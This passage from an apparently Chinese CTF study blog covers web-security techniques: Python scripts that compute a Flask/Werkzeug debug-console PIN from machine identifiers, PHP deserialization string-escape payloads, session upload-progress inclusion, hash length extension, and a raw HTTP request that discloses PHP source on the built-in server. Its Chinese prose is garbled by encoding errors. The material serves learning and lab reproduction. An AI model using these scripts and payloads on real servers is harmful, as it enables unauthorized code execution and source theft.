<p>1.&#x2F;etc&#x2F;machine-id (&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address)</p>
<p>2.&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id </p>
<p>3.&#x2F;proc&#x2F;self&#x2F;cgroup</p>
</blockquote>
<blockquote>
<p><strong>ä¸åŒç‰ˆæœ¬ç®—æ³•åŒºåˆ«</strong><br>3.6é‡‡ç”¨MD5åŠ å¯†ï¼Œ3.8é‡‡ç”¨sha1åŠ å¯†ï¼Œæ‰€ä»¥è„šæœ¬æœ‰æ‰€ä¸åŒ</p>
</blockquote>
<h3 id="ç”Ÿæˆç®—æ³•"><a href="#ç”Ÿæˆç®—æ³•" class="headerlink" title="ç”Ÿæˆç®—æ³•"></a>ç”Ÿæˆç®—æ³•</h3><p>3.6 MD5</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line">â€‹</span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span></span><br><span class="line">]</span><br><span class="line">â€‹</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">â€‹</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">â€‹</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">â€‹</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line">â€‹</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>3.8 SHA-1</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line">â€‹</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377581187&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span></span><br><span class="line">]</span><br><span class="line">â€‹</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">â€‹</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">â€‹</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">â€‹</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line">â€‹</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<h1 id="ååºåˆ—åŒ–é€ƒé€¸"><a href="#ååºåˆ—åŒ–é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–é€ƒé€¸"></a>ååºåˆ—åŒ–é€ƒé€¸</h1><blockquote>
<p>å˜çŸ­å¸æ”¶åé¢ï¼Œå˜é•¿æŒ¤æ‰åé¢</p>
<p>s:5:â€12345â€ä¸­</p>
<p>5æ˜¯è¯´æ˜ä¹Ÿæ˜¯é™åˆ¶ï¼Œåé¢çš„5ä¸ªå­—ç¬¦éƒ½å±äºå­—ç¬¦ä¸²</p>
<p>s:5:â€1234â€â€ä¸­</p>
<p>1234â€ä¹Ÿç®—æ˜¯å­—ç¬¦ä¸²ï¼Œâ€ä¸èµ·é—­åˆä½œç”¨</p>
<ol>
<li><p>å¦‚å˜é•¿</p>
<blockquote>
<p>x-&gt;yy</p>
<p>s:6:â€xxxxxxâ€</p>
<p>filterå</p>
<p>s:6:â€yyyyyyyyyyyyâ€(ååºåˆ—åŒ–ä¼šæŠ¥é”™)</p>
</blockquote>
<p>æ‰€ä»¥ä¿®æ”¹ä¸€ä¸‹filterå‰çš„</p>
<blockquote>
<p>s:6:â€xxxâ€;}â€</p>
<p>å…¶ä¸­å­—ç¬¦ä¸²ä¸ºxxxâ€;} è¿™6ä¸ªï¼Œä½†æ˜¯å½“x-&gt;yyåï¼Œxxxå˜é•¿ä¸º6ä½xxxxxx</p>
<p>s:6:â€yyyyyyâ€;}â€</p>
<p>å­—ç¬¦ä¸²å°±ä¸ºyyyyyyäº†ï¼Œ<code>&quot;;&#125;</code>å°±å®ç°äº†æˆåŠŸé€ƒé€¸ï¼Œå°†è¯­å¥é—­åˆï¼Œå½“ç„¶é€ƒé€¸æ•°æ®å¯ä»¥ä¿®æ”¹ï¼Œé•¿åº¦åˆšå¥½ä¸ºå˜é•¿éƒ¨åˆ†é•¿åº¦</p>
</blockquote>
</li>
<li><p>å¦‚å˜çŸ­</p>
<blockquote>
<p>xx-&gt;y</p>
<p>s:6:â€xxxxxxâ€;}O:5</p>
<p>filterå</p>
<p>s:6:â€yyyâ€;}O:5(ååºåˆ—åŒ–ä¼šæŠ¥é”™)</p>
</blockquote>
<p>æ‰€ä»¥ä¿®æ”¹ä¸€ä¸‹filterå‰çš„</p>
<blockquote>
<p>s:18:â€<code>xxxxxxxxxxxxxxxxxx</code>â€œ;s:23:â€<code>a&quot;;&#125;O:4:&#123;s:5:&quot;hacker&quot;;&#125;</code>â€œ;}O:5</p>
<p>å…¶ä¸­å­—ç¬¦ä¸²ä¸ºè¿™16ä¸ªï¼Œä½†æ˜¯å½“xx-&gt;yåï¼Œxxxxxxxxxxxxxxxxxxå˜çŸ­ä¸º9ä½xxxxxxxxx</p>
<p>s:18:â€<code>yyyyyyyyy&quot;;s:23:&quot;a</code>â€œ;}O:4:{s:4:â€hackerâ€;}â€;}O:5</p>
<p>å­—ç¬¦ä¸²å°±ä¸º<code>yyyyyyyyy&quot;;s:23:&quot;a</code>äº†ï¼Œ</p>
<p>è€Œ;}å°±å°†å…¶é—­åˆäº†ï¼Œè€Œå<code>O:4:&#123;s:5:&quot;hacker&quot;;&#125;</code>å°±é€ƒå‡ºæ¥äº†</p>
<p>å˜çŸ­å°±æ˜¯æ•°ä¸€ä¸‹åé¢éœ€è¦åæ‰æˆªæ–­çš„å­—ç¬¦ä¸²åˆ°å…¶æœ€åä¸€ä¸ªå¼•å·çš„å­—ç¬¦ä¸ªæ•°ï¼Œè¦æ˜¯filteræ•°æ®é•¿åº¦çš„ä¸€åŠ</p>
</blockquote>
</li>
</ol>
</blockquote>
<h1 id="sessionè¿›è¡Œæ–‡ä»¶åŒ…å«"><a href="#sessionè¿›è¡Œæ–‡ä»¶åŒ…å«" class="headerlink" title="sessionè¿›è¡Œæ–‡ä»¶åŒ…å«"></a>sessionè¿›è¡Œæ–‡ä»¶åŒ…å«</h1><blockquote>
<p><code>sessionåŒ…å«éœ€è¦sessionæ‰“å¼€ï¼Œæ²¡æ‰“å¼€æ€ä¹ˆåŠï¼Œé¡µé¢æ²¡æœ‰session</code></p>
</blockquote>
<h2 id="session-upload-progressä½œç”¨ï¼Ÿ"><a href="#session-upload-progressä½œç”¨ï¼Ÿ" class="headerlink" title="session.upload_progressä½œç”¨ï¼Ÿ"></a><code>session.upload_progress</code>ä½œç”¨ï¼Ÿ</h2><blockquote>
<p><code>session.upload_progress.enabled</code> &#x3D; <strong>on</strong></p>
<p><code>session.upload_progress.cleanup</code> &#x3D; <strong>on</strong></p>
<p><code>session.upload_progress.prefix</code> &#x3D; â€œ<strong>upload_progress_</strong>â€œ</p>
<p><code>session.upload_progress.name</code> &#x3D; â€œ<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>â€œ</p>
</blockquote>
<blockquote>
<p><code>session.upload_progress.enabled</code>å¯ä»¥æ§åˆ¶æ˜¯å¦å¼€å¯session.upload_progressåŠŸèƒ½</p>
<p><code>session.upload_progress.cleanup</code>å¯ä»¥æ§åˆ¶æ˜¯å¦åœ¨ä¸Šä¼ ä¹‹ååˆ é™¤æ–‡ä»¶å†…å®¹</p>
<p><code>session.upload_progress.prefix</code>å¯ä»¥è®¾ç½®ä¸Šä¼ æ–‡ä»¶å†…å®¹çš„å‰ç¼€</p>
<p><code>session.upload_progress.name</code>çš„å€¼å³ä¸ºsessionä¸­çš„é”®å€¼</p>
</blockquote>
<p>session.upload_progresså¼€å¯ä¹‹åï¼Œæ­¤æ—¶æˆ‘ä»¬å†å¾€æœåŠ¡å™¨ä¸­ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼ŒPHPä¼šæŠŠè¯¥æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ </p>
<p>è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ã€‚</p>
<p><strong>åˆå§‹åŒ–session</strong></p>
<p><code>session.use_strict_mode</code>æ˜¯ä¸€ä¸ªPHPé…ç½®é€‰é¡¹ï¼Œå®ƒæŒ‡å®šäº†åœ¨ä½¿ç”¨cookieå­˜å‚¨ä¼šè¯IDæ—¶æ˜¯å¦å¯ç”¨ä¸¥æ ¼æ¨¡å¼ã€‚å½“å¯ç”¨ä¸¥æ ¼æ¨¡å¼æ—¶ï¼Œä¼šè¯</p>
<p>IDåªèƒ½é€šè¿‡HTTPSè¿æ¥ä¼ è¾“ï¼Œå¹¶ä¸”ä¸èƒ½é€šè¿‡URLå‚æ•°ä¼ é€’ã€‚è¿™å¯ä»¥é˜²æ­¢ä¼šè¯åŠ«æŒæ”»å‡»ã€‚å¦‚æœæœªå¯ç”¨ä¸¥æ ¼æ¨¡å¼ï¼Œåˆ™ä¼šè¯IDå¯ä»¥é€šè¿‡HTTPè¿</p>
<p>æ¥ä¼ è¾“ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡URLå‚æ•°ä¼ é€’ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´ä¼šè¯åŠ«æŒæ”»å‡»ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>session.use_strict_mode</code>è®¾ç½®ä¸º0ï¼ˆç¦ç”¨ï¼‰</p>
<h1 id="hashé•¿åº¦æ‰©å±•æ”»å‡»"><a href="#hashé•¿åº¦æ‰©å±•æ”»å‡»" class="headerlink" title="hashé•¿åº¦æ‰©å±•æ”»å‡»"></a>hashé•¿åº¦æ‰©å±•æ”»å‡»</h1><blockquote>
<p>å­¦ä¹ æ–‡ç« </p>
<p><a href="https://j-kangel.github.io/2019/04/05/hash-attack/">hashé•¿åº¦æ‰©å±•æ”»å‡» | KANGEL (j-kangel.github.io)</a></p>
</blockquote>
<blockquote>
<p>Hashé•¿åº¦æ‹“å±•æ”»å‡»ï¼ˆLength Extension Attackï¼‰æ˜¯ä¸€ç§é’ˆå¯¹ç‰¹å®šç±»å‹å“ˆå¸Œç®—æ³•çš„æ”»å‡»æŠ€æœ¯ã€‚å“ˆå¸Œç®—æ³•æ˜¯ä¸€ç§å°†ä»»æ„å¤§å°çš„æ•°æ®è½¬æ¢æˆå›ºå®šå¤§å°å“ˆå¸Œå€¼ï¼ˆé€šå¸¸æ˜¯ä¸€ä¸²åå…­è¿›åˆ¶å­—ç¬¦ï¼‰çš„ç®—æ³•ã€‚è¿™äº›å“ˆå¸Œå€¼é€šå¸¸ç”¨äºæ ¡éªŒæ•°æ®å®Œæ•´æ€§å’ŒéªŒè¯æ•°æ®çš„å”¯ä¸€æ€§ã€‚</p>
<p>åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œå“ˆå¸Œç®—æ³•çš„è¾“å‡ºé•¿åº¦æ˜¯å›ºå®šçš„ï¼Œè€Œä¸”ç®—æ³•æ˜¯ä¸å¯é€†çš„ï¼Œæ„å‘³ç€ä»å“ˆå¸Œå€¼æ¢å¤åŸå§‹æ•°æ®æ˜¯éå¸¸å›°éš¾çš„ã€‚ä½†æ˜¯ï¼Œç”±äºä¸€äº›å“ˆå¸Œç®—æ³•çš„è®¾è®¡é—®é¢˜ï¼Œå­˜åœ¨ä¸€ç§è¢«ç§°ä¸ºâ€œHashé•¿åº¦æ‹“å±•æ”»å‡»â€çš„æ¼æ´ã€‚</p>
<p>Hashé•¿åº¦æ‹“å±•æ”»å‡»åˆ©ç”¨äº†ç‰¹å®šå“ˆå¸Œç®—æ³•çš„æ¼æ´ï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿæ ¹æ®å·²çŸ¥çš„å“ˆå¸Œå€¼å’ŒåŸå§‹æ•°æ®çš„éƒ¨åˆ†å†…å®¹ç”Ÿæˆä¸€ä¸ªæ–°çš„æœ‰æ•ˆå“ˆå¸Œå€¼ï¼Œè€Œæ— éœ€çŸ¥é“åŸå§‹æ•°æ®çš„å…¶ä½™éƒ¨åˆ†ã€‚æ”»å‡»è€…èƒ½å¤Ÿåœ¨å·²çŸ¥å“ˆå¸Œå€¼çš„åŸºç¡€ä¸Šæ„é€ å‡ºä¸€ä¸ªæ–°çš„å“ˆå¸Œå€¼ï¼Œçœ‹èµ·æ¥å°±åƒæ˜¯åœ¨å·²çŸ¥æ•°æ®åé™„åŠ äº†å…¶ä»–å†…å®¹ï¼Œå¹¶ä¸”æ–°çš„å“ˆå¸Œå€¼ä¹Ÿæ˜¯æœ‰æ•ˆçš„ã€‚</p>
</blockquote>
<h2 id="MD5åŠ å¯†åŸç†"><a href="#MD5åŠ å¯†åŸç†" class="headerlink" title="MD5åŠ å¯†åŸç†"></a>MD5åŠ å¯†åŸç†</h2><p>å…ˆæ”¾å›¾ï¼Œï¼ˆè™½ç„¶ä¸Šäº†å¯†ç å­¦è¯¾</p>
<p><img src="/post/Notes/image-20230904224135156.png" alt="image-20230904224135156"></p>
<p><img src="/post/Notes/image-20230904223823110.png" alt="image-20230904223823110"></p>
<p>æ€»å…±å¯ä»¥åˆ†ä¸ºï¼Œ</p>
<blockquote>
<ol>
<li>æŠŠæ¶ˆæ¯åˆ†ä¸ºnä¸ªåˆ†ç»„</li>
<li>å¯¹æœ€åä¸€ä¸ªæ¶ˆæ¯åˆ†ç»„è¿›è¡Œå¡«å……</li>
<li>å’Œè¾“å…¥é‡è¿›è¡Œè¿ç®—ï¼Œè¿ç®—ç»“æœä½ä¸‹ä¸€ä¸ªåˆ†ç»„çš„è¾“å…¥é‡</li>
<li>è¾“å‡ºæœ€ç»ˆç»“æœ</li>
</ol>
</blockquote>
<p>MD5ç®—æ³•è¾“å…¥çš„æ¶ˆæ¯ä»¥<code>512bit</code>çš„åˆ†ç»„ä¸ºå•ä½å¤„ç†ï¼Œå…±<code>64byte</code></p>
<p>ç„¶åå¯¹æ¯ä¸ªåˆ†ç»„è¿›è¡ŒåŠ å¯†ï¼Œå‰ä¸€æ¬¡çš„åŠ å¯†çš„ç»“æœä¼šä½œä¸ºè¿™ä¸€æ¬¡åŠ å¯†çš„è¾“å…¥ï¼Œæœ€åä¸€æ¬¡åŠ å¯†çš„ç»“æœå³ä¸ºæœ€ç»ˆçš„MD5å€¼ã€‚</p>
<p><code>ä¸è¶³64å­—èŠ‚çš„åˆ†ç»„</code>éœ€è¦è¿›è¡Œ<code>è¡¥ä½</code>ï¼Œä¹Ÿå°±æ˜¯å­—èŠ‚å¡«å……ã€‚</p>
<blockquote>
<p>è¡¥ä½åŸåˆ™ï¼šé¦–å…ˆå°†éœ€è¦hashçš„å­—ç¬¦ä¸²è¿›è¡Œåˆ†ç»„ï¼Œå³<code>å­—ç¬¦ä¸²é•¿åº¦</code>ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰æ•´é™¤64ï¼Œæœ€åä¸€ç»„<code>ä¸è¶³56å­—èŠ‚</code>çš„è¿›è¡Œå­—èŠ‚å¡«å……ã€‚å¡«å……çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º<code>0x80</code>ï¼Œå…¶ä»–å‡ä¸º<code>0x00</code>ã€‚å‰©ä¸‹çš„<code>8ä¸ªå­—èŠ‚</code>(64bit)ç”¨æ¥è¡¨ç¤ºåŸå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</p>
</blockquote>
<hr>
<p>æ‹¿<code>*CTF 2023 jwt2struts</code>é¢˜ç›®ä¸ºä¾‹</p>
<blockquote>
<p>$_COOKIE[â€œdigestâ€] è¦æ±‚ä¸º md5($salt.$username.$password)<br>è¦æ»¡è¶³$username &#x3D;&#x3D;&#x3D; â€œadminâ€ &amp;&amp; $password !&#x3D; â€œrootâ€<br>&#x2F;&#x2F;$salt &#x3D; XXXXXXXXXXXXXX &#x2F;&#x2F; the salt include 14 characters<br>&#x2F;&#x2F;md5($salt.â€adminrootâ€)&#x3D;e6ccbf12de9d33ec27a5bcfb6a3293df</p>
</blockquote>
<p>è¿™ä¸ªæ˜¯æç¤ºï¼Œå‘ç°æˆ‘ä»¬çŸ¥é“äº†<code>md5($salt.&quot;adminroot&quot;)</code>çš„å€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ç›®çš„MD5å€¼ï¼Œå†åŠ ä¸Šæˆ‘ä»¬æƒ³è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œ<code>saltçš„é•¿åº¦å·²çŸ¥</code>ï¼Œåæ®µçš„<code>adminroot</code>å·²çŸ¥</p>
<p>ç¬¦åˆæƒ…å½¢ï¼Œ</p>
<blockquote>
<ol>
<li>å·²çŸ¥éœ€è¦åŠ å¯†çš„å­—æ®µï¼ˆå¦‚ï¼Œå·²çŸ¥adminrootï¼‰</li>
<li>å·²çŸ¥saltçš„é•¿åº¦ï¼Œä½†ä¸çŸ¥é“å…·ä½“å€¼</li>
</ol>
</blockquote>
<p>å¯ä»¥ç›´æ¥ç”¨å·¥å…·<code>hashdump</code>å³å¯</p>
<h1 id="php"><a href="#php" class="headerlink" title="php&lt;&#x3D;7.4.21 å†…ç½®æœåŠ¡å™¨ä»»æ„æ–‡ä»¶è¯»å–"></a>php&lt;&#x3D;7.4.21 å†…ç½®æœåŠ¡å™¨ä»»æ„æ–‡ä»¶è¯»å–</h1><blockquote>
<p><a href="https://blog.projectdiscovery.io/php-http-server-source-disclosure/">https://blog.projectdiscovery.io/php-http-server-source-disclosure/</a></p>
</blockquote>
<p>ç¾ŠåŸæ¯é‡åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œåœ¨<code>php&lt; = 7.4.21</code>ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>å¼€å§‹çœ‹åˆ°è¿™ä¸ªé¡µé¢å…¶å®å¾ˆé™Œç”Ÿ</p>
<p><img src="/post/Notes/image-20230904170556437.png" alt="image-20230904170556437"></p>
<p>å’Œå¸¸è§çš„<code>apache</code>ä»¥åŠ<code>nginx</code>çš„404éƒ½ä¸ä¸€æ ·</p>
<p>æœäº†ä¸€ä¸‹å‘ç°æ˜¯phpå†…ç½®æœåŠ¡å™¨æ­å»ºçš„ç½‘ç«™</p>
<p><img src="/post/Notes/image-20230904205656790.png" alt="image-20230904205656790"></p>
<blockquote>
<p>ps.åé¢çœ‹å…¶ä»–äººwpæ‰çŸ¥é“ï¼Œå¯ä»¥æ‰«æç½‘ç«™çš„ï¼Œæ€•è¢«å°å·æ²¡æ‰«ï¼Œç½‘ç«™ä¸‹æœ‰ä¸ª<code>start.sh</code>ï¼Œé‡Œé¢å°±ç»™å‡ºäº†ç½‘ç«™çš„<code>å¯åŠ¨å‘½ä»¤</code>å’Œ<code>flag</code>çš„ä½ç½®ï¼Œç»“æœæˆ‘è¿˜å–è§£å¯†çœ‹é‡å®šå‘å“åº”ï¼Œéº»äº†</p>
</blockquote>
<p>å½“ç„¶é¢˜ç›®æ˜¯ååºåˆ—åŒ–è¯»æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¾—å…ˆè¯»å–åˆ°æºç å†…å®¹ï¼Œ</p>
<p>ç½‘ç«™ä¸­æƒ³è¦è¯»å–phpçš„æºç ä¸€èˆ¬æ˜¯<code>rce</code>å’Œ<code>æ–‡ä»¶åŒ…å«</code>æ‰èƒ½å¾—åˆ°ï¼Œä½†æ˜¯é¢˜ç›®åªç»™äº†<code>404</code>é¡µé¢ï¼Œä»¥åŠæœ‰ä¸ªå¾…è¯»å–æºç çš„<code>p0p.php</code>æ–‡ä»¶</p>
<p>åˆ©ç”¨phpå†…ç½®æœåŠ¡å™¨è€Œä¸é ä¸­é—´ä»¶æ­å»ºçš„ç½‘ç«™ï¼ŒçœŸçš„å®‰å…¨å—ï¼Ÿ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -S 0.0.0.0:8888</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ä¸‡èƒ½aiç»™å‡ºæ–‡ç« ç½‘ç«™</p>
<p><img src="/post/Notes/image-20230904171442398.png" alt="image-20230904171442398"></p>
<p>åœ¨php&lt;&#x3D;7.4.21ç‰ˆæœ¬ä¸­ï¼Œåˆ©ç”¨phpå†…ç½®æœåŠ¡å™¨æ­å»ºçš„ç½‘ç«™å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†ä¹Ÿåªæ˜¯åªèƒ½è¯»å–è¯¥å‘½ä»¤æ‰§è¡Œæ‰€åœ¨ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä¸è¿‡æ­£å¥½å¯ä»¥è¯»å‡º<code>p0p.php</code>çš„å†…å®¹</p>
<p>ä½†æ˜¯é¢˜ç›®å…³äº†ï¼ŒçŸ¥è¯†ç‚¹ï¼Œæˆ‘åœ¨<code>wsl</code>å¤ç°ä¸€ä¸‹</p>
<hr>
<blockquote>
<p>ç¯å¢ƒï¼š</p>
<p><code>wsl2 ç³»ç»Ÿkali</code></p>
<p><code>phpç‰ˆæœ¬ 7.0.33</code></p>
</blockquote>
<p><img src="/post/Notes/image-20230904174618539.png" alt="image-20230904174618539"></p>
<p>æˆ‘åœ¨å‘½ä»¤å¯åŠ¨çš„ç›®å½•ä¸‹ç”Ÿæˆäº†ä¸€ä¸ª<code>flag.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag&#123;test&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag_is_here&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ­£å¸¸è®¿é—®åªèƒ½çœ‹åˆ°<code>flag_is_here</code></p>
<p><img src="/post/Notes/image-20230904174602793.png" alt="image-20230904174602793"></p>
<p>ä½†æ˜¯çœ‹ä¸åˆ°<code>flag&#123;test&#125;</code></p>
<p>ä½†æ˜¯é€šè¿‡æ„é€ ç‰¹æ®Šç»“æ„çš„è¯·æ±‚ä½“å°±å¯ä»¥è®¿é—®æˆåŠŸï¼Œ</p>
<blockquote>
<p>GET &#x2F;flag.php HTTP&#x2F;1.1<br>Host: 172.28.31.86:8888</p>
<p>GET &#x2F; HTTP&#x2F;1.1</p>
</blockquote>
<p><img src="/post/Notes/image-20230904174755615.png" alt="image-20230904174755615"></p>
<p>å‘ç°<code>flag.php</code>çš„å†…å®¹è¢«å®Œå…¨æ˜¾ç¤ºå‡ºæ¥ï¼Œè€ŒæœåŠ¡å™¨ä¸­çš„è®¿é—®æ•°æ®åªæ˜¯è®¿é—®äº†é¦–é¡µ</p>
<p><img src="/post/Notes/image-20230904175028098.png" alt="image-20230904175028098"></p>
<blockquote>
<p>åŸç†æœ‰ç‚¹ç»•ï¼Œå¯ä»¥çœ‹çœ‹<code>7.4.21</code>å’Œ<code>7.4.22</code>çš„åŒºåˆ«åˆ†æä¸€ä¸‹</p>
</blockquote>
<h2 id="7-4-21"><a href="#7-4-21" class="headerlink" title="7.4.21&lt;&#x3D;ç‰ˆæœ¬&lt;&#x3D;8.0.2å¤ç°"></a>7.4.21&lt;&#x3D;ç‰ˆæœ¬&lt;&#x3D;8.0.2å¤ç°</h2><p>å½“ç„¶å¹¶ä¸æ˜¯é«˜ç‰ˆæœ¬å°±ä¸è¡Œäº†ï¼Œï¼Œå…¶å®é«˜ç‰ˆæœ¬ä¹Ÿå­˜åœ¨è¿™ä¸ªæ¼æ´</p>
<p>åœ¨ä½äº<code>8.0.2</code>ç‰ˆæœ¬çš„<code>php</code>ï¼Œå¦‚æœæƒ³è¦å¤ç°è¿™ä¸ªæ¼æ´éœ€è¦æ»¡è¶³ä¸€ä¸ªæ¡ä»¶ï¼Œå°±æ˜¯å‘½ä»¤æ‰§è¡Œæ‰€åœ¨çš„ç›®å½•ä¸‹å¿…é¡»æ²¡æœ‰<code>index.php</code>æ–‡ä»¶æ‰å¯ä»¥å®ç°</p>
<h3 id="ä½ç‰ˆæœ¬æœ‰index-phpæƒ…å†µ"><a href="#ä½ç‰ˆæœ¬æœ‰index-phpæƒ…å†µ" class="headerlink" title="ä½ç‰ˆæœ¬æœ‰index.phpæƒ…å†µ"></a>ä½ç‰ˆæœ¬æœ‰<code>index.php</code>æƒ…å†µ</h3><p>æˆ‘ä»¬å…ˆåœ¨<code>7.0.33</code>ç‰ˆæœ¬ä¸‹ç”Ÿæˆä¸€ä¸ª<code>index.php</code>æ–‡ä»¶ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;welcome index!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/Notes/image-20230904180249243.png" alt="image-20230904180249243"></p>
